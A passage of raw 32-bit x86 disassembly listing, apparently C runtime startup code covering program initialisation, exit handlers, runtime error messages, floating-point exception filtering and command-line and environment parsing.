  4245fe:	xor    eax,eax
  424600:	cmp    DWORD PTR [ecx+0xe8],esi
  424606:	setne  al
  424609:	mov    DWORD PTR [ebp-0x1c],eax
  42460c:	push   0x1
  42460e:	call   0x4253e3
  424613:	pop    ecx
  424614:	test   eax,eax
  424616:	jne    0x424620
  424618:	push   0x1c
  42461a:	call   0x424521
  42461f:	pop    ecx
  424620:	call   0x42535a
  424625:	test   eax,eax
  424627:	jne    0x424631
  424629:	push   0x10
  42462b:	call   0x424521
  424630:	pop    ecx
  424631:	call   0x425243
  424636:	mov    DWORD PTR [ebp-0x4],esi
  424639:	call   0x425045
  42463e:	test   eax,eax
  424640:	jge    0x42464a
  424642:	push   0x1b
  424644:	call   0x4244fc
  424649:	pop    ecx
  42464a:	call   DWORD PTR ds:0x429094
  424650:	mov    ds:0x463d74,eax
  424655:	call   0x424f23
  42465a:	mov    ds:0x4635b4,eax
  42465f:	call   0x424e81
  424664:	test   eax,eax
  424666:	jge    0x424670
  424668:	push   0x8
  42466a:	call   0x4244fc
  42466f:	pop    ecx
  424670:	call   0x424c4e
  424675:	test   eax,eax
  424677:	jge    0x424681
  424679:	push   0x9
  42467b:	call   0x4244fc
  424680:	pop    ecx
  424681:	call   0x424759
  424686:	mov    DWORD PTR [ebp-0x20],eax
  424689:	cmp    eax,esi
  42468b:	je     0x424694
  42468d:	push   eax
  42468e:	call   0x4244fc
  424693:	pop    ecx
  424694:	mov    DWORD PTR [ebp-0x38],esi
  424697:	lea    eax,[ebp-0x64]
  42469a:	push   eax
  42469b:	call   DWORD PTR ds:0x429090
  4246a1:	call   0x424be5
  4246a6:	mov    DWORD PTR [ebp-0x68],eax
  4246a9:	test   BYTE PTR [ebp-0x38],0x1
  4246ad:	je     0x4246b5
  4246af:	movzx  eax,WORD PTR [ebp-0x34]
  4246b3:	jmp    0x4246b8
  4246b5:	push   0xa
  4246b7:	pop    eax
  4246b8:	push   eax
  4246b9:	push   DWORD PTR [ebp-0x68]
  4246bc:	push   esi
  4246bd:	push   esi
  4246be:	call   edi
  4246c0:	push   eax
  4246c1:	call   0x423030
  4246c6:	mov    edi,eax
  4246c8:	mov    DWORD PTR [ebp-0x6c],edi
  4246cb:	cmp    DWORD PTR [ebp-0x1c],esi
  4246ce:	jne    0x4246d6
  4246d0:	push   edi
  4246d1:	call   0x424891
  4246d6:	call   0x4248b3
  4246db:	jmp    0x424708
  4246dd:	mov    eax,DWORD PTR [ebp-0x14]
  4246e0:	mov    ecx,DWORD PTR [eax]
  4246e2:	mov    ecx,DWORD PTR [ecx]
  4246e4:	mov    DWORD PTR [ebp-0x70],ecx
  4246e7:	push   eax
  4246e8:	push   ecx
  4246e9:	call   0x424a81
  4246ee:	pop    ecx
  4246ef:	pop    ecx
  4246f0:	ret    
  4246f1:	mov    esp,DWORD PTR [ebp-0x18]
  4246f4:	mov    edi,DWORD PTR [ebp-0x70]
  4246f7:	cmp    DWORD PTR [ebp-0x1c],0x0
  4246fb:	jne    0x424703
  4246fd:	push   edi
  4246fe:	call   0x4248a2
  424703:	call   0x4248c2
  424708:	or     DWORD PTR [ebp-0x4],0xffffffff
  42470c:	mov    eax,edi
  42470e:	lea    esp,[ebp-0x7c]
  424711:	call   0x42546f
  424716:	ret    
  424717:	push   0x429284
  42471c:	call   DWORD PTR ds:0x42902c
  424722:	test   eax,eax
  424724:	je     0x42473c
  424726:	push   0x429274
  42472b:	push   eax
  42472c:	call   DWORD PTR ds:0x429028
  424732:	test   eax,eax
  424734:	je     0x42473c
  424736:	push   DWORD PTR [esp+0x4]
  42473a:	call   eax
  42473c:	push   DWORD PTR [esp+0x4]
  424740:	call   DWORD PTR ds:0x42909c
  424746:	int3   
  424747:	push   0x8
  424749:	call   0x4255ef
  42474e:	pop    ecx
  42474f:	ret    
  424750:	push   0x8
  424752:	call   0x42555b
  424757:	pop    ecx
  424758:	ret    
  424759:	mov    eax,ds:0x463d70
  42475e:	test   eax,eax
  424760:	je     0x424764
  424762:	call   eax
  424764:	push   esi
  424765:	push   edi
  424766:	mov    ecx,0x42b00c
  42476b:	mov    edi,0x42b018
  424770:	xor    eax,eax
  424772:	cmp    ecx,edi
  424774:	mov    esi,ecx
  424776:	jae    0x42478f
  424778:	test   eax,eax
  42477a:	jne    0x4247bb
  42477c:	mov    ecx,DWORD PTR [esi]
  42477e:	test   ecx,ecx
  424780:	je     0x424784
  424782:	call   ecx
  424784:	add    esi,0x4
  424787:	cmp    esi,edi
  424789:	jb     0x424778
  42478b:	test   eax,eax
  42478d:	jne    0x4247bb
  42478f:	push   0x425287
  424794:	call   0x425700
  424799:	mov    esi,0x42b000
  42479e:	mov    eax,esi
  4247a0:	mov    edi,0x42b008
  4247a5:	cmp    eax,edi
  4247a7:	pop    ecx
  4247a8:	jae    0x4247b9
  4247aa:	mov    eax,DWORD PTR [esi]
  4247ac:	test   eax,eax
  4247ae:	je     0x4247b2
  4247b0:	call   eax
  4247b2:	add    esi,0x4
  4247b5:	cmp    esi,edi
  4247b7:	jb     0x4247aa
  4247b9:	xor    eax,eax
  4247bb:	pop    edi
  4247bc:	pop    esi
  4247bd:	ret    
  4247be:	push   ebp
  4247bf:	mov    ebp,esp
  4247c1:	push   esi
  4247c2:	push   edi
  4247c3:	push   0x8
  4247c5:	call   0x4255ef
  4247ca:	xor    esi,esi
  4247cc:	inc    esi
  4247cd:	cmp    DWORD PTR ds:0x463604,esi
  4247d3:	pop    ecx
  4247d4:	jne    0x4247e6
  4247d6:	push   DWORD PTR [ebp+0x8]
  4247d9:	call   DWORD PTR ds:0x429064
  4247df:	push   eax
  4247e0:	call   DWORD PTR ds:0x4290a0
  4247e6:	cmp    DWORD PTR [ebp+0xc],0x0
  4247ea:	mov    al,BYTE PTR [ebp+0x10]
  4247ed:	mov    DWORD PTR ds:0x463600,esi
  4247f3:	mov    ds:0x4635fc,al
  4247f8:	jne    0x42484c
  4247fa:	mov    ecx,DWORD PTR ds:0x463d68
  424800:	test   ecx,ecx
  424802:	je     0x42482d
  424804:	mov    eax,ds:0x463d64
  424809:	sub    eax,0x4
  42480c:	cmp    eax,ecx
  42480e:	jmp    0x424826
  424810:	mov    eax,DWORD PTR [eax]
  424812:	test   eax,eax
  424814:	je     0x424818
  424816:	call   eax
  424818:	mov    eax,ds:0x463d64
  42481d:	sub    eax,0x4
  424820:	cmp    eax,DWORD PTR ds:0x463d68
  424826:	mov    ds:0x463d64,eax
  42482b:	jae    0x424810
  42482d:	mov    eax,0x42b01c
  424832:	mov    esi,0x42b020
  424837:	cmp    eax,esi
  424839:	mov    edi,eax
  42483b:	jae    0x42484c
  42483d:	mov    eax,DWORD PTR [edi]
  42483f:	test   eax,eax
  424841:	je     0x424845
  424843:	call   eax
  424845:	add    edi,0x4
  424848:	cmp    edi,esi
  42484a:	jb     0x42483d
  42484c:	mov    eax,0x42b024
  424851:	mov    esi,0x42b028
  424856:	cmp    eax,esi
  424858:	mov    edi,eax
  42485a:	jae    0x42486b
  42485c:	mov    eax,DWORD PTR [edi]
  42485e:	test   eax,eax
  424860:	je     0x424864
  424862:	call   eax
  424864:	add    edi,0x4
  424867:	cmp    edi,esi
  424869:	jb     0x42485c
  42486b:	cmp    DWORD PTR [ebp+0x10],0x0
  42486f:	pop    edi
  424870:	pop    esi
  424871:	je     0x42487c
  424873:	push   0x8
  424875:	call   0x42555b
  42487a:	jmp    0x42488e
  42487c:	push   DWORD PTR [ebp+0x8]
  42487f:	mov    DWORD PTR ds:0x463604,0x1
  424889:	call   0x424717
  42488e:	pop    ecx
  42488f:	pop    ebp
  424890:	ret    
  424891:	push   0x0
  424893:	push   0x0
  424895:	push   DWORD PTR [esp+0xc]
  424899:	call   0x4247be
  42489e:	add    esp,0xc
  4248a1:	ret    
  4248a2:	push   0x0
  4248a4:	push   0x1
  4248a6:	push   DWORD PTR [esp+0xc]
  4248aa:	call   0x4247be
  4248af:	add    esp,0xc
  4248b2:	ret    
  4248b3:	push   0x1
  4248b5:	push   0x0
  4248b7:	push   0x0
  4248b9:	call   0x4247be
  4248be:	add    esp,0xc
  4248c1:	ret    
  4248c2:	push   0x1
  4248c4:	push   0x1
  4248c6:	push   0x0
  4248c8:	call   0x4247be
  4248cd:	add    esp,0xc
  4248d0:	ret    
  4248d1:	push   ebp
  4248d2:	mov    ebp,esp
  4248d4:	sub    esp,0x10c
  4248da:	mov    eax,ds:0x462f30
  4248df:	xor    eax,DWORD PTR [ebp+0x4]
  4248e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4248e5:	push   ebx
  4248e6:	push   esi
  4248e7:	mov    DWORD PTR [ebp-0x4],eax
  4248ea:	xor    edx,edx
  4248ec:	push   edi
  4248ed:	xor    eax,eax
  4248ef:	cmp    ecx,DWORD PTR [eax*8+0x462cc0]
  4248f6:	je     0x4248fe
  4248f8:	inc    eax
  4248f9:	cmp    eax,0x12
  4248fc:	jb     0x4248ef
  4248fe:	mov    esi,eax
  424900:	shl    esi,0x3
  424903:	cmp    ecx,DWORD PTR [esi+0x462cc0]
  424909:	jne    0x424a32
  42490f:	mov    eax,ds:0x4635bc
  424914:	cmp    eax,0x1
  424917:	je     0x424a0d
  42491d:	cmp    eax,edx
  42491f:	jne    0x42492e
  424921:	cmp    DWORD PTR ds:0x462cb8,0x1
  424928:	je     0x424a0d
  42492e:	cmp    ecx,0xfc
  424934:	je     0x424a32
  42493a:	push   0x104
  42493f:	lea    eax,[ebp-0x10c]
  424945:	push   eax
  424946:	push   edx
  424947:	mov    BYTE PTR [ebp-0x8],dl
  42494a:	call   DWORD PTR ds:0x4290a8
  424950:	test   eax,eax
  424952:	jne    0x424967
  424954:	lea    eax,[ebp-0x10c]
  42495a:	push   0x4295dc
  42495f:	push   eax
  424960:	call   0x425810
  424965:	pop    ecx
  424966:	pop    ecx
  424967:	lea    eax,[ebp-0x10c]
  42496d:	push   eax
  42496e:	lea    edi,[ebp-0x10c]
  424974:	call   0x425a40
  424979:	inc    eax
  42497a:	cmp    eax,0x3c
  42497d:	pop    ecx
  42497e:	jbe    0x4249a9
  424980:	lea    eax,[ebp-0x10c]
  424986:	push   eax
  424987:	call   0x425a40
  42498c:	mov    edi,eax
  42498e:	lea    eax,[ebp-0x10c]
  424994:	sub    eax,0x3b
  424997:	push   0x3
  424999:	add    edi,eax
  42499b:	push   0x4295d8
  4249a0:	push   edi
  4249a1:	call   0x425910
  4249a6:	add    esp,0x10
  4249a9:	push   edi
  4249aa:	call   0x425a40
  4249af:	push   DWORD PTR [esi+0x462cc4]
  4249b5:	mov    ebx,eax
  4249b7:	call   0x425a40
  4249bc:	lea    eax,[ebx+eax*1+0x1c]
  4249c0:	pop    ecx
  4249c1:	add    eax,0x3
  4249c4:	pop    ecx
  4249c5:	and    eax,0xfffffffc
  4249c8:	call   0x425480
  4249cd:	mov    ebx,esp
  4249cf:	push   0x4295bc
  4249d4:	push   ebx
  4249d5:	call   0x425810
  4249da:	push   edi
  4249db:	push   ebx
  4249dc:	call   0x425820
  4249e1:	push   0x4295b8
  4249e6:	push   ebx
  4249e7:	call   0x425820
  4249ec:	push   DWORD PTR [esi+0x462cc4]
  4249f2:	push   ebx
  4249f3:	call   0x425820
  4249f8:	push   0x12010
  4249fd:	push   0x429590
  424a02:	push   ebx
  424a03:	call   0x425712
  424a08:	add    esp,0x2c
  424a0b:	jmp    0x424a32
  424a0d:	push   edx
  424a0e:	lea    eax,[ebp+0x8]
  424a11:	push   eax
  424a12:	lea    esi,[esi+0x462cc4]
  424a18:	push   DWORD PTR [esi]
  424a1a:	call   0x425a40
  424a1f:	pop    ecx
  424a20:	push   eax
  424a21:	push   DWORD PTR [esi]
  424a23:	push   0xfffffff4
  424a25:	call   DWORD PTR ds:0x4290a4
  424a2b:	push   eax
  424a2c:	call   DWORD PTR ds:0x429080
  424a32:	lea    esp,[ebp-0x118]
  424a38:	mov    ecx,DWORD PTR [ebp-0x4]
  424a3b:	xor    ecx,DWORD PTR [ebp+0x4]
  424a3e:	call   0x425afc
  424a43:	pop    edi
  424a44:	pop    esi
  424a45:	pop    ebx
  424a46:	leave  
  424a47:	ret    
  424a48:	mov    eax,ds:0x4635bc
  424a4d:	cmp    eax,0x1
  424a50:	je     0x424a5f
  424a52:	test   eax,eax
  424a54:	jne    0x424a80
  424a56:	cmp    DWORD PTR ds:0x462cb8,0x1
  424a5d:	jne    0x424a80
  424a5f:	push   0xfc
  424a64:	call   0x4248d1
  424a69:	mov    eax,ds:0x463608
  424a6e:	test   eax,eax
  424a70:	pop    ecx
  424a71:	je     0x424a75
  424a73:	call   eax
  424a75:	push   0xff
  424a7a:	call   0x4248d1
  424a7f:	pop    ecx
  424a80:	ret    
  424a81:	push   ebp
  424a82:	mov    ebp,esp
  424a84:	push   ecx
  424a85:	push   ebx
  424a86:	push   esi
  424a87:	push   edi
  424a88:	call   0x4252e9
  424a8d:	mov    edi,DWORD PTR [ebp+0x8]
  424a90:	mov    esi,eax
  424a92:	mov    edx,DWORD PTR [esi+0x54]
  424a95:	mov    eax,ds:0x462dd4
  424a9a:	mov    ecx,edx
  424a9c:	cmp    DWORD PTR [ecx],edi
  424a9e:	je     0x424aad
  424aa0:	lea    ebx,[eax+eax*2]
  424aa3:	add    ecx,0xc
  424aa6:	lea    ebx,[edx+ebx*4]
  424aa9:	cmp    ecx,ebx
  424aab:	jb     0x424a9c
  424aad:	lea    eax,[eax+eax*2]
  424ab0:	lea    eax,[edx+eax*4]
  424ab3:	cmp    ecx,eax
  424ab5:	jae    0x424abb
  424ab7:	cmp    DWORD PTR [ecx],edi
  424ab9:	je     0x424abd
  424abb:	xor    ecx,ecx
  424abd:	test   ecx,ecx
  424abf:	je     0x424bd7
  424ac5:	mov    ebx,DWORD PTR [ecx+0x8]
  424ac8:	test   ebx,ebx
  424aca:	mov    DWORD PTR [ebp+0x8],ebx
  424acd:	je     0x424bd7
  424ad3:	cmp    ebx,0x5
  424ad6:	jne    0x424ae4
  424ad8:	and    DWORD PTR [ecx+0x8],0x0
  424adc:	xor    eax,eax
  424ade:	inc    eax
  424adf:	jmp    0x424be0
  424ae4:	cmp    ebx,0x1
  424ae7:	je     0x424bd2
  424aed:	mov    eax,DWORD PTR [esi+0x58]
  424af0:	mov    DWORD PTR [ebp-0x4],eax
  424af3:	mov    eax,DWORD PTR [ebp+0xc]
  424af6:	mov    DWORD PTR [esi+0x58],eax
  424af9:	mov    eax,DWORD PTR [ecx+0x4]
  424afc:	cmp    eax,0x8
  424aff:	jne    0x424bc4
  424b05:	mov    edx,DWORD PTR ds:0x462dc8
  424b0b:	mov    eax,ds:0x462dcc
  424b10:	add    eax,edx
  424b12:	cmp    edx,eax
  424b14:	jge    0x424b3d
  424b16:	lea    eax,[edx+edx*2]
  424b19:	shl    eax,0x2
  424b1c:	mov    edi,DWORD PTR [esi+0x54]
  424b1f:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424b24:	mov    edi,DWORD PTR ds:0x462dc8
  424b2a:	mov    ebx,DWORD PTR ds:0x462dcc
  424b30:	inc    edx
  424b31:	add    ebx,edi
  424b33:	add    eax,0xc
  424b36:	cmp    edx,ebx
  424b38:	jl     0x424b1c
  424b3a:	mov    ebx,DWORD PTR [ebp+0x8]
  424b3d:	mov    ecx,DWORD PTR [ecx]
  424b3f:	cmp    ecx,0xc000008e
  424b45:	mov    edi,DWORD PTR [esi+0x5c]
  424b48:	jne    0x424b53
  424b4a:	mov    DWORD PTR [esi+0x5c],0x83
  424b51:	jmp    0x424bb7
  424b53:	cmp    ecx,0xc0000090
  424b59:	jne    0x424b64
  424b5b:	mov    DWORD PTR [esi+0x5c],0x81
  424b62:	jmp    0x424bb7
  424b64:	cmp    ecx,0xc0000091
  424b6a:	jne    0x424b75
  424b6c:	mov    DWORD PTR [esi+0x5c],0x84
  424b73:	jmp    0x424bb7
  424b75:	cmp    ecx,0xc0000093
  424b7b:	jne    0x424b86
  424b7d:	mov    DWORD PTR [esi+0x5c],0x85
  424b84:	jmp    0x424bb7
  424b86:	cmp    ecx,0xc000008d
  424b8c:	jne    0x424b97
  424b8e:	mov    DWORD PTR [esi+0x5c],0x82
  424b95:	jmp    0x424bb7
  424b97:	cmp    ecx,0xc000008f
  424b9d:	jne    0x424ba8
  424b9f:	mov    DWORD PTR [esi+0x5c],0x86
  424ba6:	jmp    0x424bb7
  424ba8:	cmp    ecx,0xc0000092
  424bae:	jne    0x424bb7
  424bb0:	mov    DWORD PTR [esi+0x5c],0x8a
  424bb7:	push   DWORD PTR [esi+0x5c]
  424bba:	push   0x8
  424bbc:	call   ebx
  424bbe:	pop    ecx
  424bbf:	mov    DWORD PTR [esi+0x5c],edi
  424bc2:	jmp    0x424bcb
  424bc4:	and    DWORD PTR [ecx+0x8],0x0
  424bc8:	push   eax
  424bc9:	call   ebx
  424bcb:	mov    eax,DWORD PTR [ebp-0x4]
  424bce:	pop    ecx
  424bcf:	mov    DWORD PTR [esi+0x58],eax
  424bd2:	or     eax,0xffffffff
  424bd5:	jmp    0x424be0
  424bd7:	push   DWORD PTR [ebp+0xc]
  424bda:	call   DWORD PTR ds:0x4290ac
  424be0:	pop    edi
  424be1:	pop    esi
  424be2:	pop    ebx
  424be3:	leave  
  424be4:	ret    
  424be5:	cmp    DWORD PTR ds:0x463d6c,0x0
  424bec:	jne    0x424bf3
  424bee:	call   0x42601c
  424bf3:	push   esi
  424bf4:	mov    esi,DWORD PTR ds:0x463d74
  424bfa:	test   esi,esi
  424bfc:	jne    0x424c05
  424bfe:	mov    esi,0x4295f3
  424c03:	jmp    0x424c4a
  424c05:	mov    al,BYTE PTR [esi]
  424c07:	cmp    al,0x22
  424c09:	jne    0x424c33
  424c0b:	inc    esi
  424c0c:	mov    al,BYTE PTR [esi]
  424c0e:	cmp    al,0x22
  424c10:	je     0x424c43
  424c12:	test   al,al
  424c14:	je     0x424c2c
  424c16:	movzx  eax,al
  424c19:	push   eax
  424c1a:	call   0x425b3b
  424c1f:	test   eax,eax
  424c21:	pop    ecx
  424c22:	je     0x424c25
  424c24:	inc    esi
  424c25:	inc    esi
  424c26:	mov    al,BYTE PTR [esi]
  424c28:	cmp    al,0x22
  424c2a:	jne    0x424c12
  424c2c:	cmp    BYTE PTR [esi],0x22
  424c2f:	jne    0x424c44
  424c31:	jmp    0x424c43
  424c33:	cmp    al,0x20
  424c35:	jbe    0x424c44
  424c37:	inc    esi
  424c38:	cmp    BYTE PTR [esi],0x20
  424c3b:	ja     0x424c37
  424c3d:	jmp    0x424c44
  424c3f:	cmp    al,0x20
  424c41:	ja     0x424c4a
  424c43:	inc    esi
  424c44:	mov    al,BYTE PTR [esi]
  424c46:	test   al,al
  424c48:	jne    0x424c3f
  424c4a:	mov    eax,esi
  424c4c:	pop    esi
  424c4d:	ret    
  424c4e:	push   ebx
  424c4f:	xor    ebx,ebx
  424c51:	cmp    DWORD PTR ds:0x463d6c,ebx
  424c57:	push   esi
  424c58:	push   edi
  424c59:	jne    0x424c60
  424c5b:	call   0x42601c
  424c60:	mov    esi,DWORD PTR ds:0x4635b4
  424c66:	xor    edi,edi
  424c68:	cmp    esi,ebx
  424c6a:	jne    0x424c7e
  424c6c:	jmp    0x424c9e
  424c6e:	cmp    al,0x3d
  424c70:	je     0x424c73
  424c72:	inc    edi
  424c73:	push   esi
  424c74:	call   0x425a40
  424c79:	pop    ecx
  424c7a:	lea    esi,[esi+eax*1+0x1]
  424c7e:	mov    al,BYTE PTR [esi]
  424c80:	cmp    al,bl
  424c82:	jne    0x424c6e
  424c84:	lea    eax,[edi*4+0x4]
  424c8b:	push   eax
  424c8c:	call   0x426152
  424c91:	mov    edi,eax
  424c93:	cmp    edi,ebx
  424c95:	pop    ecx
  424c96:	mov    DWORD PTR ds:0x4635e4,edi
  424c9c:	jne    0x424ca3
  424c9e:	or     eax,0xffffffff
  424ca1:	jmp    0x424cfb
  424ca3:	mov    esi,DWORD PTR ds:0x4635b4
  424ca9:	push   ebp
  424caa:	jmp    0x424cd6
  424cac:	push   esi
  424cad:	call   0x425a40
  424cb2:	mov    ebp,eax
  424cb4:	inc    ebp
  424cb5:	cmp    BYTE PTR [esi],0x3d
  424cb8:	pop    ecx
  424cb9:	je     0x424cd4
  424cbb:	push   ebp
  424cbc:	call   0x426152
  424cc1:	cmp    eax,ebx
  424cc3:	pop    ecx
  424cc4:	mov    DWORD PTR [edi],eax
  424cc6:	je     0x424cff
  424cc8:	push   esi
  424cc9:	push   eax
  424cca:	call   0x425810
  424ccf:	pop    ecx
  424cd0:	pop    ecx
  424cd1:	add    edi,0x4
  424cd4:	add    esi,ebp
  424cd6:	cmp    BYTE PTR [esi],bl
  424cd8:	jne    0x424cac
  424cda:	push   DWORD PTR ds:0x4635b4
  424ce0:	call   0x42603a
  424ce5:	mov    DWORD PTR ds:0x4635b4,ebx
  424ceb:	mov    DWORD PTR [edi],ebx
  424ced:	mov    DWORD PTR ds:0x463d60,0x1
  424cf7:	xor    eax,eax
  424cf9:	pop    ecx
  424cfa:	pop    ebp
  424cfb:	pop    edi
  424cfc:	pop    esi
  424cfd:	pop    ebx
  424cfe:	ret    
  424cff:	push   DWORD PTR ds:0x4635e4
  424d05:	call   0x42603a
  424d0a:	mov    DWORD PTR ds:0x4635e4,ebx
  424d10:	or     eax,0xffffffff
  424d13:	jmp    0x424cf9
  424d15:	push   ebp
  424d16:	mov    ebp,esp
  424d18:	push   ecx
  424d19:	push   ebx
  424d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1d:	xor    edx,edx
  424d1f:	cmp    DWORD PTR [ebp+0x8],edx
  424d22:	push   edi
  424d23:	mov    DWORD PTR [esi],edx
  424d25:	mov    edi,ecx
  424d27:	mov    DWORD PTR [ebx],0x1
  424d2d:	je     0x424d38
  424d2f:	mov    ecx,DWORD PTR [ebp+0x8]
  424d32:	add    DWORD PTR [ebp+0x8],0x4
  424d36:	mov    DWORD PTR [ecx],edi
  424d38:	cmp    BYTE PTR [eax],0x22
  424d3b:	jne    0x424d4b
  424d3d:	xor    ecx,ecx
  424d3f:	test   edx,edx
  424d41:	sete   cl
  424d44:	inc    eax
  424d45:	mov    edx,ecx
  424d47:	mov    cl,0x22
  424d49:	jmp    0x424d78
  424d4b:	inc    DWORD PTR [esi]
  424d4d:	test   edi,edi
  424d4f:	je     0x424d56
  424d51:	mov    cl,BYTE PTR [eax]
  424d53:	mov    BYTE PTR [edi],cl
  424d55:	inc    edi
  424d56:	mov    cl,BYTE PTR [eax]
  424d58:	movzx  ebx,cl
  424d5b:	inc    eax
  424d5c:	test   BYTE PTR [ebx+0x463a21],0x4
  424d63:	je     0x424d71
  424d65:	inc    DWORD PTR [esi]
  424d67:	test   edi,edi
  424d69:	je     0x424d70
  424d6b:	mov    bl,BYTE PTR [eax]
  424d6d:	mov    BYTE PTR [edi],bl
  424d6f:	inc    edi
  424d70:	inc    eax
  424d71:	test   cl,cl
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	je     0x424daa
  424d78:	test   edx,edx
  424d7a:	jne    0x424d38
  424d7c:	cmp    cl,0x20
  424d7f:	je     0x424d86
  424d81:	cmp    cl,0x9
  424d84:	jne    0x424d38
  424d86:	test   edi,edi
  424d88:	je     0x424d8e
  424d8a:	and    BYTE PTR [edi-0x1],0x0
  424d8e:	and    DWORD PTR [ebp-0x4],0x0
  424d92:	cmp    BYTE PTR [eax],0x0
  424d95:	je     0x424e71
  424d9b:	mov    cl,BYTE PTR [eax]
  424d9d:	cmp    cl,0x20
  424da0:	je     0x424da7
  424da2:	cmp    cl,0x9
  424da5:	jne    0x424dad
  424da7:	inc    eax
  424da8:	jmp    0x424d9b
  424daa:	dec    eax
  424dab:	jmp    0x424d8e
  424dad:	cmp    BYTE PTR [eax],0x0
  424db0:	je     0x424e71
  424db6:	cmp    DWORD PTR [ebp+0x8],0x0
  424dba:	je     0x424dc5
  424dbc:	mov    ecx,DWORD PTR [ebp+0x8]
  424dbf:	add    DWORD PTR [ebp+0x8],0x4
  424dc3:	mov    DWORD PTR [ecx],edi
  424dc5:	inc    DWORD PTR [ebx]
  424dc7:	xor    ebx,ebx
  424dc9:	inc    ebx
  424dca:	xor    edx,edx
  424dcc:	jmp    0x424dd0
  424dce:	inc    eax
  424dcf:	inc    edx
  424dd0:	cmp    BYTE PTR [eax],0x5c
  424dd3:	je     0x424dce
  424dd5:	cmp    BYTE PTR [eax],0x22
  424dd8:	jne    0x424e00
  424dda:	test   dl,0x1
  424ddd:	jne    0x424dfe
  424ddf:	cmp    DWORD PTR [ebp-0x4],0x0
  424de3:	je     0x424df1
  424de5:	lea    ecx,[eax+0x1]
  424de8:	cmp    BYTE PTR [ecx],0x22
  424deb:	jne    0x424df1
  424ded:	mov    eax,ecx
  424def:	jmp    0x424df3
  424df1:	xor    ebx,ebx
  424df3:	xor    ecx,ecx
  424df5:	cmp    DWORD PTR [ebp-0x4],ecx
  424df8:	sete   cl
  424dfb:	mov    DWORD PTR [ebp-0x4],ecx
  424dfe:	shr    edx,1
  424e00:	test   edx,edx
  424e02:	je     0x424e11
  424e04:	test   edi,edi
  424e06:	je     0x424e0c
  424e08:	mov    BYTE PTR [edi],0x5c
  424e0b:	inc    edi
  424e0c:	inc    DWORD PTR [esi]
  424e0e:	dec    edx
  424e0f:	jne    0x424e04
  424e11:	mov    cl,BYTE PTR [eax]
  424e13:	test   cl,cl
  424e15:	je     0x424e5f
  424e17:	cmp    DWORD PTR [ebp-0x4],0x0
  424e1b:	jne    0x424e27
  424e1d:	cmp    cl,0x20
  424e20:	je     0x424e5f
  424e22:	cmp    cl,0x9
  424e25:	je     0x424e5f
  424e27:	test   ebx,ebx
  424e29:	je     0x424e59
  424e2b:	test   edi,edi
  424e2d:	je     0x424e48
  424e2f:	movzx  edx,cl
  424e32:	test   BYTE PTR [edx+0x463a21],0x4
  424e39:	je     0x424e41
  424e3b:	mov    BYTE PTR [edi],cl
  424e3d:	inc    edi
  424e3e:	inc    eax
  424e3f:	inc    DWORD PTR [esi]
  424e41:	mov    cl,BYTE PTR [eax]
  424e43:	mov    BYTE PTR [edi],cl
  424e45:	inc    edi
  424e46:	jmp    0x424e57
  424e48:	movzx  ecx,cl
  424e4b:	test   BYTE PTR [ecx+0x463a21],0x4
  424e52:	je     0x424e57
  424e54:	inc    eax
  424e55:	inc    DWORD PTR [esi]
  424e57:	inc    DWORD PTR [esi]
  424e59:	inc    eax
  424e5a:	jmp    0x424dc7
  424e5f:	test   edi,edi
  424e61:	je     0x424e67
  424e63:	and    BYTE PTR [edi],0x0
  424e66:	inc    edi
  424e67:	inc    DWORD PTR [esi]
  424e69:	mov    ebx,DWORD PTR [ebp+0xc]
  424e6c:	jmp    0x424d92
  424e71:	mov    eax,DWORD PTR [ebp+0x8]
  424e74:	test   eax,eax
  424e76:	je     0x424e7b
  424e78:	and    DWORD PTR [eax],0x0
  424e7b:	inc    DWORD PTR [ebx]
  424e7d:	pop    edi
  424e7e:	pop    ebx
  424e7f:	leave  
  424e80:	ret    
  424e81:	push   ebp
  424e82:	mov    ebp,esp
  424e84:	push   ecx
  424e85:	push   ecx
  424e86:	push   ebx
  424e87:	push   esi
  424e88:	push   edi
  424e89:	xor    edi,edi
  424e8b:	cmp    DWORD PTR ds:0x463d6c,edi
  424e91:	jne    0x424e98
  424e93:	call   0x42601c
  424e98:	and    BYTE PTR ds:0x463714,0x0
  424e9f:	push   0x104
  424ea4:	mov    esi,0x463610
  424ea9:	push   esi
  424eaa:	push   edi
  424eab:	call   DWORD PTR ds:0x4290a8
  424eb1:	mov    eax,ds:0x463d74
  424eb6:	cmp    eax,edi
  424eb8:	mov    DWORD PTR ds:0x4635f4,esi
  424ebe:	je     0x424ec7
  424ec0:	cmp    BYTE PTR [eax],0x0
  424ec3:	mov    ebx,eax
  424ec5:	jne    0x424ec9
  424ec7:	mov    ebx,esi
  424ec9:	lea    eax,[ebp-0x4]
  424ecc:	push   eax
  424ecd:	push   edi
  424ece:	lea    esi,[ebp-0x8]
  424ed1:	xor    ecx,ecx
  424ed3:	mov    eax,ebx
  424ed5:	call   0x424d15
  424eda:	mov    esi,DWORD PTR [ebp-0x4]
  424edd:	mov    eax,DWORD PTR [ebp-0x8]
  424ee0:	shl    esi,0x2
  424ee3:	add    eax,esi
  424ee5:	push   eax
  424ee6:	call   0x426152
  424eeb:	mov    edi,eax
  424eed:	add    esp,0xc
  424ef0:	test   edi,edi
  424ef2:	jne    0x424ef9
  424ef4:	or     eax,0xffffffff
  424ef7:	jmp    0x424f1e
  424ef9:	lea    eax,[ebp-0x4]
  424efc:	push   eax
  424efd:	lea    ecx,[esi+edi*1]
  424f00:	push   edi
  424f01:	lea    esi,[ebp-0x8]
  424f04:	mov    eax,ebx
  424f06:	call   0x424d15
  424f0b:	mov    eax,DWORD PTR [ebp-0x4]
  424f0e:	dec    eax
  424f0f:	pop    ecx
  424f10:	mov    ds:0x4635d8,eax
  424f15:	pop    ecx
  424f16:	mov    DWORD PTR ds:0x4635dc,edi
  424f1c:	xor    eax,eax
  424f1e:	pop    edi
  424f1f:	pop    esi
  424f20:	pop    ebx
  424f21:	leave  
  424f22:	ret    
  424f23:	push   ecx
  424f24:	push   ecx
  424f25:	mov    eax,ds:0x463718
  424f2a:	push   ebx
  424f2b:	push   ebp
  424f2c:	push   esi
  424f2d:	push   edi
  424f2e:	mov    edi,DWORD PTR ds:0x4290c0
  424f34:	xor    ebx,ebx
  424f36:	xor    esi,esi
  424f38:	cmp    eax,ebx
  424f3a:	push   0x2
  424f3c:	pop    ebp
  424f3d:	jne    0x424f6c
  424f3f:	call   edi
  424f41:	mov    esi,eax
  424f43:	cmp    esi,ebx
  424f45:	je     0x424f53
